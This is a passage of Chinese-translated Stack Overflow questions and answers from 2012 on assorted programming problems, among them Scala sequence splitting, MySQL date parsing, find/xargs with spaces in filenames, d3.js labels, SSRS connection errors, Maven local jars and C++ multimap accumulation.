尽管在 Scala 中，我在编写这个（基本）函数时遇到了很多困难。对于递归，`Array`似乎并不适应。然后，`if`允许我实现我在 haskell 中使用的那种守卫的结构不允许代替表达式，这对我来说似乎很奇怪。我遇到的另一个问题是我不知道如何使我的 scala 代码多态（就像我的 Haskell 代码一样）。最后但并非最不重要的一点是，我不明白如何不仅制作`a`等效的多态，而且制作`Array`实例，因为 Scala 中有许多基本集合。

我可以~~使用完整的解释解决方案或~~简单的提示来回答我的误解。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T21:42:19.453

翻译很直接。我没有单独调用`take`and `drop`，而是使用`splitAt`which 可能更有效。当然，你可以使这个尾递归。而且我还要争辩说，“惯用的” Scala 可能会在`IndexedSeq.newBuilder`方法内部使用，这可能再次更有效，但我想这不是你想要的。

请注意，Scala 的数组是可变的，因此您需要`Vector`或更通用的数组`IndexedSeq`。

```
import collection.immutable.{IndexedSeq => ISeq}

def split[A](seq: ISeq[A], pieces: Int): ISeq[ISeq[A]] = {
  val n = seq.size / pieces
  def loop(xs: ISeq[A]): ISeq[ISeq[A]] = {   
    val l = xs.size
    if(l > n) {
      val m = l % n
      val (begin, end) = xs.splitAt(if(m == 0) n else n + 1)
      begin +: loop(end)
    } else ISeq(xs)
  }
  loop(seq)
}

split(1 to 20, 3) // correct 
```

# mysql - Mysql Varchar 到 GMT 日期时间值的转换

> ID：12646103
> 
> 赞同：1
> 
> 时间：2012-09-28T19:22:21.690
> 
> 标签：mysql, varchar, datetime-format, gmt, string-to-datetime

我很抱歉提出这个问题，但我已经搜索并找到了任何符合我需求的东西。我已经使用它，但似乎无法维持生计。

我有一个专栏`SrcFileName (VarChar(100))`

它填充了文件名（即 AB20120928.143815458.txt） AB 没有改变，扩展名 (.TXT) 也没有改变。

我正在尝试将该 SrcFileName 转换为 DateTime 值。这是 GMT 时间戳。

`str_to_date(Date_Field,'AB%YYYY%MM%DD.%HH%MM%SS.txt')`不起作用，我相信我需要`Str_to_Date`与`Convert()`.

任何帮助表示赞赏！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T19:32:17.283

应该这样做，只需使用 SUBSTR 获取要解析的字符串的正确部分并在其上使用 STR_TO_DATE ；

```
SELECT STR_TO_DATE(SUBSTR(SrcFileName,3,15), '%Y%m%d.%H%i%s') FROM TableA; 
```

# scala - 如何使 sbt 在本地 maven 存储库中查找 scala dist？

> ID：12646110
> 
> 赞同：2
> 
> 时间：2012-09-28T19:22:36.460
> 
> 标签：scala, sbt

我设法构建了自己的 scala 发行版，并将其在本地发布到 maven 存储库 ( `~/.m2/repository`)。但是当我将 sbt 设置为使用该版本时，它只会在本地 ivy、typesafe-ivy-releases、Maven Central 和 sonatype-snaphshots 中显示。它不在本地 maven 存储库中查找，即使我`project/plugins.sbt`按如下方式指定它：

```
resolvers += "Local Maven Repository" at "file://" + Path.userHome.absolutePath + "/.m2/repository" 
```

我也试过：

```
resolvers += Resolver.mavenLocal 
```

当然，我可以手动将文件从 maven repo 移动到 ivy，但这似乎太糟糕了。我应该怎么做才能让它工作？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-29T11:45:25.487

在 SBT 中，您可以直接设置 Scala 主页，不需要 maven 存储库：

scalaHome := Some(file("/path/to/scala"))

来源：[https ://github.com/harrah/xsbt/wiki/Local-Scala](https://github.com/harrah/xsbt/wiki/Local-Scala)

# objective-c - 按下空格键时记录时间

> ID：12646112
> 
> 赞同：0
> 
> 时间：2012-09-28T19:22:54.310
> 
> 标签：objective-c, cocoa

当空格键被按下时，我试图在 HH:MM:SS 中记录时间。我在研究中发现使用 cocoa 比使用基础更容易，因为 cocoa 有一个 NSEvent 类可以感知击键。有一个类似的问题询问如何感知双空格键被击中，但它不满足如何将其与我的程序相关联。

下面的代码：

```
NSDate *startTime = [NSDate date ];
NSTimeInterval elaspedTime = [startTime timeIntervalSinceNow];

-(void)sendEvent:(NSEvent *) theEvent{
    NSString* spaceBarPressed = [ theEvent characters ];
    if( [spaceBarPressed isEqualToString:@"" ] ){
        if(theEvent.type == NSKeyDown )
            NSLog(@"Space bar hit" );
    }
} 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-28T19:48:55.457

可以这样做：

```
- (void)keyDown:(NSEvent *)theEvent { 

    if ([theEvent keyCode] == 49) { //Spacebar keyCode is 49
        NSLog(@"Time is: %@", [NSDateFormatter localizedStringFromDate:[NSDate date] dateStyle:NSDateFormatterNoStyle timeStyle:NSDateFormatterMediumStyle]);
    }
} 
```

# javascript - 我有一组字符串数据，我希望将其绘制在所需的分区中，字符串整齐地靠近绘制的圆圈

> ID：12646114
> 
> 赞同：1
> 
> 时间：2012-09-28T19:23:21.997
> 
> 标签：javascript, html, svg, d3.js

```
var svgcanvas = d3.select("body").append("svg:svg")
.attr("width", 725)
.attr("height", 500); 
```

我的数据集样本，将从数据库中提取

```
var jsoncirclehigh =[

                        { 
                            "blah":"Javascript",
                            "blah":"",
                            "blah":"",

                        },
                            {

                                "Technology": "D3",
                                "TechField":"",
                                "Devphase":"",

                            }, 
                    ]; 
```

我忘记添加的形状

```
 svgcanvas.append("svg:path")
    .attr("d","M -200,0 A200,200 0 0,0 500,0 L -200,0") 
    .attr("transform", "translate(220,400) scale(1, -1)")
    .style("stroke-width", 2)
    .style("stroke", "steelblue")
    .style("fill", "yellow"); 
```

我创建的想要与数据匹配的圈子

```
 svgcanvas.append("circle")
    .attr("r", 2.5)
    .attr("cx", 200)
    .attr("cy", 250)
    .style("stroke", "steelblue")
    .style("fill", "blue")
    .on("mouseover", function(){d3.select(this).style("fill", "aliceblue");})
    .on("mouseout", function() {d3.select(this).style("fill", "blue");})
    .text(function(d) {return d;}); 
```

试图将文本与圆圈匹配但没有用

```
 svgcanvas.selectAll("text")
                                    .data(jsoncirclehigh)
                                    .enter()
                                    .append("text")
                                    .attr("font-family", "sans-serif")
                                    .attr("font-size", "11px")
                                    .attr("fill", "red"); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T04:45:12.830

理想情况下，您的圈子`jsoncirclehigh`将使用相同的数据结构。d3.js 的重点是使用数据（如`jsoncirclehigh`）来驱动 SVG 元素的创建。尝试更多类似的东西：

```
var svgcanvas = d3.select("body").append("svg:svg")
    .attr("width", 500)
    .attr("height", 500);

var jsoncirclehigh = [
                       {cx:100, cy: 100, r: 2.5,
                        label:"technology"},
                       {cx:200, cy: 200, r: 2.5,
                        label:"rocks"}
                     ];

svgcanvas.selectAll("circle")
         .data(jsoncirclehigh)
         .enter().append("circle")
           .attr("r", function (d) { return d.r; })
           .attr("cx", function (d) { return d.cx; })
           .attr("cy", function (d) { return d.cy; })
           .style("stroke", "steelblue")
           .style("fill", "blue");

svgcanvas.selectAll("text")
       .data(jsoncirclehigh)
       .enter().append("svg:text")
        .text(function(d) { return d.label; })
        .attr("x", function (d) { return d.cx + 10; })
        .attr("y", function (d) { return d.cy + 10; }); 
```

[http://jsfiddle.net/2jw9k/4/](http://jsfiddle.net/2jw9k/4/)

# css - css 使图像压在文本上

> ID：12646120
> 
> 赞同：0
> 
> 时间：2012-09-28T19:23:43.333
> 
> 标签：css

我一定要休息一天，我被css弄糊涂了。

我有一个可能存在也可能不存在的图像。使用最少的标记，我想推过整个文本块，这样如果它太长，它就不会包裹在图像下。通常我只会浮动图像并使用设置的边距，但由于图像不存在有时我想要一个更灵活的解决方案。也许这个插图会有所帮助。

![在此处输入图像描述](../Images/2bb8c4551aa152c374fd333c19127798.png)

如果没有额外的标记或动态使用两个不同的类，我想不出任何方法。我尝试过的大部分内容都涉及浮动一个或两个元素。p 没有设定长度，因此在某些情况下将 padding-bottom 放在 img 下是不够的，或者如果 p 太短会导致不必要的空间。有什么建议么？

编辑：这是由 Mark Adams 提供的 jsfiddle，但这几乎是我所困的地方。

[JSFiddle](http://jsfiddle.net/cGQ6K/4/)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T19:30:28.830

你不能让图像向左浮动吗？还是我从你的问题中遗漏了什么？

像这样：

[http://jsfiddle.net/cGQ6K/](http://jsfiddle.net/cGQ6K/)

编辑-或者如果段落溢出或类似的东西，您是否希望图像消失？

edit2-在我的 jsfiddle 中向我的段落添加更多文本后，我想我现在知道你的意思了......我会尝试找出一个解决方案

edit3 - 这是您想要的解决方案：http: [//jsfiddle.net/cGQ6K/7/](http://jsfiddle.net/cGQ6K/7/)虽然它使用了一些技巧。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T19:40:09.733

我不知道您为什么会遇到问题，因为 Mark Adams 示例有效，但我相信在某些情况下我们可以使用“clear” CSS 属性来解决。

我们最常使用“clear:both”，但您可以为图像尝试“clear:right”或“right”。

请参阅此处的 CSS Clear 属性参考： [http ://www.w3schools.com/cssref/pr_class_clear.asp](http://www.w3schools.com/cssref/pr_class_clear.asp)

# bash - 查找文件名中的空格

> ID：12646124
> 
> 赞同：3
> 
> 时间：2012-09-28T19:23:55.260
> 
> 标签：bash, grep, find, xargs

我经常将 grep 与 find 一起使用两次，以便在文件中搜索两个模式，如下所示：

```
find . -name \*.xml | xargs grep -l "<beans" | xargs grep singleton 
```

然后我遇到了带有空格的文件，这当然破坏了上述命令。我对其进行了如下修改以处理空格：

```
find . -name \*.xml -print0 | xargs -0 grep -l "<beans" | xargs grep singleton 
```

选项 -print0 告诉 find 使用 print null 作为分隔符而不是空格， -0 告诉 xargs 期待 null。只要我要查找的所有文件的路径中都没有空格，它就可以工作，但如果有，它就会中断。

所以我需要一个标志来告诉 grep 打印 null 作为 speartor 而不是换行符。

有任何想法吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-28T19:39:25.373

好问题。您可以使用 Z 选项使 grep -l 使用空值作为分隔符：

```
find . -name \*.xml -print0 | xargs -0 grep -lZ "<beans" | xargs grep singleton 
```

您还可以将 xargs 设为换行符作为分隔符。这也应该适用：

```
find . -name \*.xml -print0 | xargs -0 grep -l "<beans" | xargs "--delimiter=\n" grep singleton 
```

不过，第一个解决方案更好。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-29T09:45:06.153

```
find . -name "*.xml"  -exec grep -q "<beans" {} \; -exec grep -q "singleton" {} \; -print 
```

如果您打算像上面所做的那样在以后的管道序列中使用这些文件名，请更改`-print`为`-print0`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-05T14:37:47.397

如果您使用 GNU Parallel 而不是 xargs 那么您可以避免处理这个问题，因为默认情况下 GNU Parallel 在换行符而不是空格上拆分。

```
find . -name \*.xml | parallel grep -l "<beans" | parallel grep singleton 
```

观看介绍视频以了解更多信息：[https ://www.youtube.com/playlist?list=PL284C9FF2488BC6D1](https://www.youtube.com/playlist?list=PL284C9FF2488BC6D1)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-08-03T11:06:31.673

为了避免空格问题，我将使用换行符作为带有 -d 选项的 xargs 的分隔符：

```
xargs -d '\n' ... 
```

对于两个单独的模式搜索，我会使用 egrep：

```
egrep '(pattern one|pattern two)' ... 
```

所以我的完整解决方案是：

```
find . -name \*.xml | xargs -d '\n' egrep '(pattern one|pattern two)' 
```

# php - 如何打印变量和数组的名称？

> ID：12646125
> 
> 赞同：1
> 
> 时间：2012-09-28T19:24:00.050
> 
> 标签：php, arrays, variables

> **可能重复：**
> [如何在 PHP 中将变量名作为字符串获取？](https://stackoverflow.com/questions/255312/how-to-get-a-variable-name-as-a-string-in-php)

我需要类似于以下代码的内容：

**代码**

```
<?php

$var1='my var 1';

$array1['1']='first position of my array 1';
$array1['2']='second position of my array 1';

echo name($var1);

echo "<br>";

echo name($array1);

function name($parameter){
...?...
}
?> 
```

**屏幕返回**

```
var1
array1 
```

所以，我需要编写一个函数，给我传递给它的变量或数组的**名称。**我该怎么做？

我将在另一个函数上使用这个函数来对我执行一些任务......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T19:44:38.520

正如@bfavaretto 所说，

这对我来说很好：

```
<?php

$var1='my var 1';

$array1['1']='first position of my array 1';
$array1['2']='second position of my array 1';

echo name($var1);

echo "<br>";

echo name($array1);

function name(&$var, $scope=false, $prefix='unique', $suffix='value'){
    if($scope) $vals = $scope;
    else      $vals = $GLOBALS;
    $old = $var;
    $var = $new = $prefix.rand().$suffix;
    $vname = FALSE;
    foreach($vals as $key => $val) {
      if($val === $new) $vname = $key;
    }
    $var = $old;
    return $vname;
}
?> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T19:41:31.040

尝试通过以下方式修改函数（未经测试）

```
function print_var_name($var) { 
    $left=var_export($var, true);
    foreach($GLOBALS as $var_name => $value) { 
        $right=var_export($value, true);
        if ($left === $right) { 
             return $var_name; 
        } 
    } 
    return false; 
} 
```

# c - 从“运行”窗口执行带有参数的程序

> ID：12646126
> 
> 赞同：1
> 
> 时间：2012-09-28T19:24:00.720
> 
> 标签：c, windows, command-line

我用 C 编写了一个简单的程序，在当前目录中创建一个文件（文件名来自第一个参数）：

```
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv){
   FILE *fp;
   if(argc != 2) exit(1);
   fp = fopen(argv[1], "w");
   if(fp == NULL) exit(1);
   fclose(fp);
   return 0;
} 
```

我用 Visual Studio C 编译器编译它，生成可执行文件`createfile.exe`，我将它放在我的桌面上并隐藏。然后我将我的桌面添加到我的路径环境变量中。

我的目标是能够打开“运行”窗口（使用 Win+R）并键入以在我的桌面上`createfile myfile.tex`创建文件。`myfile.tex`当我在命令提示符中执行程序时，程序按预期工作，但如果我在“运行”窗口中键入命令，则不会创建任何文件。

如何修改程序*或*环境以使其如上所述工作？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T19:33:00.950

该文件可能已写入，但您无法控制工作目录。可以使用[`SetCurrentDirectory`](http://msdn.microsoft.com/en-us/library/aa365530%28VS.85%29.aspx)，但是在Windows下，桌面可以在任何地方，并且是本地化的。在我的法语 Windows XP 中，它被命名为“Bureau”。这就是[SHGetSpecialFolderLocation](http://msdn.microsoft.com/en-us/library/windows/desktop/bb762203%28v=vs.85%29.aspx)进来的时候。

大多数人放弃了，而不是程序，他们创建了这个批处理文件：

```
@echo off

pushd %~dp0
IF NOT EXIST "%1" (
rem this next line is like the unix utility "touch"
echo. 2> %1
)
popd 
```

它将在与它自己的批处理文件相同的目录中创建一个空文件。

# python - 我可以使用回调在网页上逐步显示查询结果吗？

> ID：12646127
> 
> 赞同：2
> 
> 时间：2012-09-28T19:24:03.410
> 
> 标签：python, tornado

我正在使用 tornado 2.3 (python 2.7.3) 并且正在对 postgresql (9.2.1) 数据库运行大量查询。这大约需要 8 秒才能完成，我想知道是否可以使用回调（使用 momoko 连接器到 postgres）来逐步更新页面的查询结果。我在 tornado demos 文件夹中找到了 facebook 示例，但这需要单击才能刷新 - 但我希望在检索到查询结果时调用 UI 模块进行渲染。

当前的（未完成的）代码如下所示：

```
 results = OrderedDict()
    cursor = yield gen.Task(self.db.execute, 'select location, string_of_words from source;')
    for verse in cursor.fetchall():
        queries = {}
        id = 0
        for word in verse[4].split(' '):
            queries[id] = ['select worddetailsbyword(%s)',(word,)]
            id += 1
        cursors = yield gen.Task(self.db.batch, queries)
        for key,cursor in cursors.items():
            worddata = {}
            if verse[0] not in results.keys():
                results[verse[0]] = []                                              
            results[verse[0]].append(cursor.fetchone())

    for loc, words in results.items():
        self.write("<h2>%s</h2>" % loc)
        for word in words:
            self.write("<div>%s</div>"%word[0]) 
```

与其等待所有这些完成，*然后*在模板中呈现，我可以实现一个回调并让每个查询完成都命中该回调并更新网页吗？

# visual-studio-2008 - 连接到报表服务器的尝试失败。检查您的连接信息以及报表服务器是否为兼容版本

> ID：12646128
> 
> 赞同：0
> 
> 时间：2012-09-28T19:24:04.967
> 
> 标签：visual-studio-2008, ssrs-2008

当我尝试从应用程序调用报告时出现此错误。我的报告在报告服务器上正常工作。

我正在使用以下代码：

```
Private Sub ShowJobTravelerReport(ByVal strworkORdeID As String, ByVal strQAFormID As String, ByVal strReportName As String)
        Dim paramList As New Generic.List(Of Microsoft.Reporting.WebForms.ReportParameter)
        paramList.Add(New Microsoft.Reporting.WebForms.ReportParameter("WorkOrderID", strworkORdeID, False))
        paramList.Add(New Microsoft.Reporting.WebForms.ReportParameter("QAFormID", strQAFormID, False))
        showReport(strReportName, paramList)
    End Sub

Private Sub showReport(ByVal strReportName As String, ByRef paramList As Generic.List(Of Microsoft.Reporting.WebForms.ReportParameter))
    Try
        ' Load data only when displaying the page for the first time
        If (Not Me.IsPostBack) Then
            Dim newuri As New Uri(System.Configuration.ConfigurationManager.AppSettings("MyReportViewerUrl").ToString())
            ReportViewer1.ServerReport.ReportPath = System.Configuration.ConfigurationManager.AppSettings("MyReportViewerReportPath").ToString() + strReportName.trim()
            ReportViewer1.ServerReport.ReportServerUrl = newuri
            ' Dim rptcon As 
            ReportViewer1.ServerReport.ReportServerCredentials = New MyReportServerCredentials()
            ReportViewer1.ProcessingMode = Microsoft.Reporting.WebForms.ProcessingMode.Remote
            ReportViewer1.ServerReport.SetParameters(paramList)
        End If

    Catch ex As Exception
        ' An error has occured so display an error message.
        Utils.RegisterJScriptAlert(Me, "Page_Load_Error_Message", ex.Message)
    End Try

End Sub 
```

我的 Web.Config 文件在下面..

```
<add key="ReportViewerServerConnection" value="MyReportServerConnection, App_Code" />
<add key="MyReportViewerReportPath" value="/Reports/" />
<add key="MyReportViewerUrl" value="http://MyServer:port/Reports" />
<add key="MyReportViewerDomain" value="*******" />
<add key="MyReportViewerPassword" value="******" />
<add key="MyReportViewerUser" value="******" /> 
```

有人可以帮我解决这个问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-01T05:56:36.833

它在错误中告诉您出了什么问题 -*检查您的连接信息并且报告服务器是兼容版本*。因此，在这些领域之一的开发和生产之间可能存在一些差异......您可以验证您是否可以使用确切的凭据手动连接 - 也许某些东西（如防火墙）正在干扰您的连接，或者也许凭证中有错字。如果不是这种情况，也许可以尝试比较软件版本，尝试查找并解决任何差异。祝你好运！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-12-29T15:55:23.453

对我来说，这与版本无关。

在 SSRS 2014 中，我通过修改我的 rsreportserver.config 文件解决了这个问题。我的 ReportServerUrl 设置错误。我将其更改为我的实际 SSRS ReportServer URL。

像这样：

```
<ReportServerUrl>http://localhost/InstanceName_ReportServer</ReportServerUrl> 
```

我从[这个页面](http://stepbistep.net/2012/02/28/ssrs-error-2-the-attempt-to-connect-to-the-report-server-failed-check-your-connection-information-and-that-the-report-server-is-a-compatible-version/)获得了帮助，该页面包含有关 SSRS 先前版本的说明。

# c# - 如何为 wcf ria 服务调用释放内存？

> ID：12646137
> 
> 赞同：0
> 
> 时间：2012-09-28T19:24:27.497
> 
> 标签：c#, wcf-ria-services, silverlight-5.0

我在静态方法中有以下代码，用于带有 wcf ria 服务的 silverlight 应用程序：

```
public static void mymethod(){
DomainContext context = new DomainContext();
var q = context.GetMyEntitiesQuery().Where(x => x.Name == name );
context.Load<MyEntity>(q, LoadBehavior.RefreshCurrent,
  (p) =>
  {
  if (!p.HasError)
    {
     //......     
    }

  }, null);
} 
```

它工作正常。但是每次我调用这个方法时，浏览器进程的内存会增加大约3M，并且永远不会释放。

这种情况下如何释放内存？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T21:23:12.537

您应该尽可能少的 DomainContext 实例。也许从调用者传递上下文

```
Thing.mymethod(context); 
```

或保留一个静态实例

```
public static class Thing
{
    DomainContext _Context = new DomainContext();

    public static void mymethod()
    {
        var q = _context.GetMyEntitiesQuery().Where(x => x.Name == name );
        ...
    }
} 
```

您创建的每个实例都可能存在并造成内存泄漏。

# maven - Maven 本地存储库根本不适用于第三方 jar

> ID：12646140
> 
> 赞同：1
> 
> 时间：2012-09-28T19:24:48.160
> 
> 标签：maven, maven-2, maven-3

我是这个 maven 的新手，我在本地存储库中遇到了很大的问题。

我想添加一个第三方 jar，处理这个问题是我有类似的东西：

```
 <dependency>
            <groupId>com.thirdParty</groupId>
            <artifactId>thirdParty</artifactId>
            <version>4.0.2</version>
            <scope>system</scope>
            <systemPath>${basedir}/lib/thirdParty_4_0_2/thirdParty.jar</systemPath>
        </dependency> 
```

它的工作很棒，但我收到了一些警告，我想删除这些警告。

```
[WARNING] Some problems were encountered while building the effective model for com.thirdParty.connector:thirdParty:mule-module:1.0
[WARNING] 'dependencies.dependency.systemPath' for com.thirdParty:thirdParty:jar should not point at files within the project directory, ${basedir}/lib/thirdParty_java_client_4_0_2/thirdParty.jar will be unresolvable by dependent projects @ line 239, column 20 
```

因此，我听说我可以拥有一个 Maven 本地存储库并在那里添加我所有的第三方 jar，然后在我的 XML 中添加一个存储库，然后调用它们，而不是这样做。

所以我有类似的东西：

```
 <repository>
        <id>local-maven-repository</id>
        <name>local-maven-repository</name>
        <releases>
            <enabled>true</enabled>
            <checksumPolicy>ignore</checksumPolicy>
        </releases>
        <snapshots>
            <enabled>false</enabled>
        </snapshots>
        <url>file://${project.basedir}/../../local-maven-repository</url>
    </repository> 
```

在 local-maven-repository 里面我有类似的东西：

```
local-maven-repository
|-- com 
|   |-- thirdparty
|       |-- sdk
|           | -- 4.0.0
|                | thirdParty-4.0.0.jar
|                | thirdParty-4.0.0.pom 
```

我收到了这个错误。

```
[ERROR] Failed to execute goal on project thirdParty: Could not resolve dependencies for project com.thirdParty.connector:thirdParty:mule-module:1.0: Failure to find com.thirdParty:thirdParty:jar:4.0.2 in file:///Users/moises.vega/Developer/Telstra/telstra-thunder/connectors/thirdParty/../../local-maven-repository was cached in the local repository, resolution will not be reattempted until the update interval of local-maven-repository has elapsed or updates are forced -> [Help 1] 
```

有人能指出我解决这个问题的正确方向吗？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T19:30:45.723

不要使用系统依赖项。不要尝试在磁盘中创建存储库。

如果您需要的东西不在 Maven 中心，那么（最好）部署 Nexus 或 Archiva 或 Artifactory 并将其部署在那里。如果您不能这样做，请将其放入 ~/.m2/repository 和 install:install-file。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T19:39:05.580

从 Maven 良好实践的角度来看，这两种解决方案都很糟糕。

就个人而言，我会使用您提到的第一个解决方案，并接受警告。Maven 抱怨（出于某种原因）如果您有一个依赖项目，该项目将无法找到 jar 文件，因为 ${project.basedir} 将解析到不同的目录。这将适用于这两种解决方案，即使你设法使第二个工作。

如果您没有本地 maven 存储库（例如 nexus 或 artifactory），我认为第二*好的*解决方案可能是编写一个运行 的脚本`mvn install:install-file`，作为构建过程的一部分，您需要运行该脚本然后运行任何 Maven 命令。这也可以从 pom 文件中完成，但这有点棘手，需要更多设置。您将需要一个多模块项目，并且要运行的第一个模块应该运行安装插件，以安装 jar。您可以通过使所有其他子模块依赖于安装依赖项的模块来做到这一点。

# c++ - 如何在多图中将结构累积为值类型？

> ID：12646144
> 
> 赞同：0
> 
> 时间：2012-09-28T19:25:22.217
> 
> 标签：c++, c++11, std, multimap, accumulate

我有一个以字符串为键、以 Cnode 结构为值的多重映射：

```
struct Cnode
{
    Cnode() : wtA(0), wtC(0), wtG(0), wtT(0) { }
    Cnode(int newA, int newC, int newG, int newT)
      : wtA(newA), wtC(newC), wtG(newG), wtT(newT)
    { }

    int wtA, wtC, wtG, wtT;
};

Cnode combine_valuesA(const myFast map, const string& key)
{
    return std::accumulate(
        map.equal_range(key).first,
        map.equal_range(key).second,
        0,
        [](int sumA, int sumC, int sumG, int sumT, myFast::value_type p) //error
        {
            return Cnode(
                sumA + p.second.wtA,
                sumC + p.second.wtC,
                sumG + p.second.wtG,
                sumT + p.second.wtT);
        }
    );
} 
```

我需要在 Cnode 中为多图上的重复键添加所有整数。这是我得到的错误：

没有从“int”到“Cnode”的可行转换

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-28T19:48:51.470

这似乎具有您正在寻找的语义：

```
struct Cnode
{
    Cnode() : wtA(), wtC(), wtG(), wtT() { }
    Cnode(int a, int c, int g, int t)
      : wtA(a), wtC(c), wtG(g), wtT(t)
    { }

    int wtA, wtC, wtG, wtT;
};
typedef std::multimap<std::string, Cnode> myFast;

myFast::mapped_type combine_valuesA(myFast const& map, std::string const& key)
{
    auto range = map.equal_range(key);
    return std::accumulate(
        range.first, range.second, myFast::mapped_type(),
        [](myFast::mapped_type const& node, myFast::value_type const& p)
        {
            return myFast::mapped_type(
                node.wtA + p.second.wtA,
                node.wtC + p.second.wtC,
                node.wtG + p.second.wtG,
                node.wtT + p.second.wtT
            );
        }
    );
} 
```

请注意，`Cnode`可以用 、 或 替换`std::valarray<int>`，`std::array<int, 4>`以`std::tuple<int, int, int, int>`简化代码；这是使用第一个的样子：

```
typedef std::multimap<std::string, std::valarray<int>> myFast;

myFast::mapped_type combine_valuesA(myFast const& map, std::string const& key)
{
    auto range = map.equal_range(key);
    return std::accumulate(
        range.first, range.second, myFast::mapped_type(4),
        [](myFast::mapped_type const& node, myFast::value_type const& p)
        {
            return node + p.second;
        }
    );
} 
```

# android - 完全完成/关闭偏好活动/片段

> ID：12646146
> 
> 赞同：0
> 
> 时间：2012-09-28T19:25:35.047
> 
> 标签：android, android-4.0-ice-cream-sandwich

我正在使用preferenceActivy 类来管理我的偏好。但我需要从一个片段中关闭整个偏好。源代码被切割成一个最小的例子

```
public class VPNPreferences extends PreferenceActivity {
   public boolean onOptionsItemSelected(MenuItem item) {
       finish(); // This should close fragment + Preferences list
   }

   public boolean onCreateOptionsMenu(Menu menu) {
       getMenuInflater().inflate(R.menu.vpnpreferences_menu, menu);
      return super.onCreateOptionsMenu(menu);
   }

} 
```

我使用新的 3.2+ API，它在表格上显示为两列，在手机上显示为单独的活动。菜单图标在列表和带有片段的 Activity 上都可见。

当按下按钮按钮时，活动应该关闭，如果活动是片段，则从设置列表中调用该设置列表也应该关闭。不幸的是，finish() 只关闭当前的片段活动。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T20:32:57.730

我所做的是`BroadcastReceiver`在我的每个偏好活动中注册 a ，它所做的只是调用`finish()`. 当我想关闭设置时，我会发送带有该操作的广播。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-03-20T11:53:16.937

我所做的是打电话

```
NavUtils.navigateUpFromSameTask(getActivity()); 
```

例如，在我更改了 am OnPreferenceChangeListener 中的设置的片段内。

您还需要在 manifest.xml 中设置谁是 PreferenceActivity 父级

# apache-commons-config - 用自定义替换默认配置迭代器

> ID：12646147
> 
> 赞同：1
> 
> 时间：2012-09-28T19:25:35.437
> 
> 标签：apache-commons-config

我一直在尝试在公共配置中注册一个自定义配置插值器，默认情况下会处理一些后备值。

这是插值器的代码。

```
 public class FallbackConfigurationInterpolator extends ConfigurationInterpolator {

    Pattern p = Pattern.compile("\\d+$");

    public FallbackConfigurationInterpolator() {
        super();
    }

    @Override
    public String lookup(String var) {
        String value = super.lookup(var);
        if (StringUtils.startsWith(value, "${") && endsWithDigits(var)) {
            value = super.lookup(valueWithRemovedDigits(var));
        }
        return value;
    }

    private String valueWithRemovedDigits(String var) {
        return var.replace("\\d+$", StringUtils.EMPTY);
    }

    private boolean endsWithDigits(String var) {
        return p.matcher(var).matches();
    }

} 
```

这是我的配置生成器的样子

```
 public class CustomCommonsConfigurationBuilder extends DefaultConfigurationBuilder {

        public CustomCommonsConfigurationBuilder() {
            super();
        }

        public CustomCommonsConfigurationBuilder(String fileName) throws ConfigurationException {
            super(fileName);
        }

        public CustomCommonsConfigurationBuilder(File file) {
            super(file);
        }

        public CustomCommonsConfigurationBuilder(URL url) throws ConfigurationException {
            super(url);
        }

        @Override
        protected ConfigurationInterpolator createInterpolator() {
            FallbackConfigurationInterpolator interpol = new FallbackConfigurationInterpolator();
            interpol.setDefaultLookup(new StrLookup() {
                @Override
                public String lookup(String var) {
                    Object prop = resolveContainerStore(var);
                    return (prop != null) ? prop.toString() : null;
                }
            });
            return interpol;
        }
    } 
```

这是我实例化我的配置生成器的方式。

```
@Before
    public void setup() throws ConfigurationException {
        System.setProperty("environment", "local");
        config = (AbstractConfiguration) new CustomCommonsConfigurationBuilder("commons-configuration.xml")
            .getConfiguration();
        config.getSubstitutor().setEnableSubstitutionInVariables(true);
    } 
```

由于某种原因，我的自定义插值器中的查找方法永远不会被调用。如果您已成功注册自定义插值器，有人可以帮忙吗？

提前致谢。

# php - simplexml_load_file() 上的错误消息

> ID：12646149
> 
> 赞同：0
> 
> 时间：2012-09-28T19:25:44.320
> 
> 标签：php

我是 PHP 函数的新手，并尝试使用 simplexml_load_file() 在我的终端中读取 xml 文件，但收到如下代码所示的错误。我不知道这是否会有所不同，但我在 mac os x OS、Mountain Lion 上运行，并且 xml 文件位于我本地机器上的目录中。任何建议/方向将不胜感激。问候。

这是功能：

```
function xmlFileLoader($sourceDir) {

// Properties
$sourceXmlDir = scandir($sourceDir);
$count_xml_files = count($sourceXmlDir);

// Removes any directory or file other than XML file from the contents of the $sourceDir variable:
for( $i = 0; $i < $count_xml_files; $i++ ) {
    $path_info = pathinfo( $sourceXmlDir[$i] );

    if( preg_match( '/^\./', $sourceXmlDir[$i] ) || is_dir( $sourceXmlDir . '/' . $sourceXmlDir[$i] ) || ( strtoupper( $path_info['extension'] ) <> 'XML' ) )
    {
        unset( $sourceXmlDir[$i] );
    }
}

// Get the correct count of the values in the $sourceXmlDir after the unset function completes
$sourceXmlArray = array_values($sourceXmlDir);
$count_xml_files = count($sourceXmlArray);

if ($count_xml_files > 0) {

    // Cycle through the XML files in the $sourceXmlArray
    foreach ($sourceXmlArray as $xmlFile) {

        $sFile = simplexml_load_file($xmlFile);

        print_r($sFile);
    }
